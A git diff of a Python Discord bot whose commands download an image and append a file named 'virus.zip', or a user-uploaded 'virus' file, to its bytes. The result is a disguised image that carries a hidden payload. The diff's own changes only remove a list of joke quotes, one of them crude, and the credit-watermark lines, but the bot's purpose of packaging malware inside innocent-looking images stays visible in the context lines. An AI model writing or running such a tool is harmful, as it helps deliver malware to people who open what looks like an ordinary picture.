@@ -9,14 +9,6 @@ intents.members = True
 
 bot = commands.Bot(command_prefix='.', intents=intents, case_insensitive=True)
 watermark = "  ____  _\n |  _ \(_)\n | |_) |_ _ __  _ __ ___   ___ _ __ __ _  ___\n |  _ <| | '_ \| '_ ` _ \ / _ \ '__/ _` |/ _ \ \n | |_) | | | | | | | | | |  __/ | | (_| |  __/\n |____/|_|_| |_|_| |_| |_|\___|_|  \__, |\___|\n                                    __/ |\n                                   |___/"
-memeQuotes = [
-    "Trying to not cum",
-    "you find what you want here",
-    "why are you wasting your time here? go outside and touch grass",
-    "Sponsored by raycon earbuds",
-    "This file is sponsored by nord vpn",
-#   "",
-]
 
 @bot.event
 async def on_ready():
@@ -44,7 +36,6 @@ class BotChannel(commands.Cog, name="<#863261299487014947> channel commands"):
         if ctx.channel.id == 863261299487014947:
             image = requests.get(ctx.message.attachments[0].url).content
             virusFile = open("virus.zip", 'rb').read()
-            credits = bytes(f'\n\n{watermark}\n{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\n\n', 'utf-8')
 
             with open("tempfiles/" + str(ctx.message.author.id), "wb") as file:
                 file.write(image + virusFile)
@@ -66,7 +57,6 @@ class Dms(commands.Cog, name='Dm only commands'):
         """Merge 2 given files"""
         image = requests.get(videoOrImage).content
         virusFile = requests.get(ctx.message.attachments[0].url).content
-        credits = bytes(f'\n\n{watermark}\n{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
 
         with open("tempfiles/" + str(ctx.message.author.id), "wb") as file:
             file.write(image + virusFile)
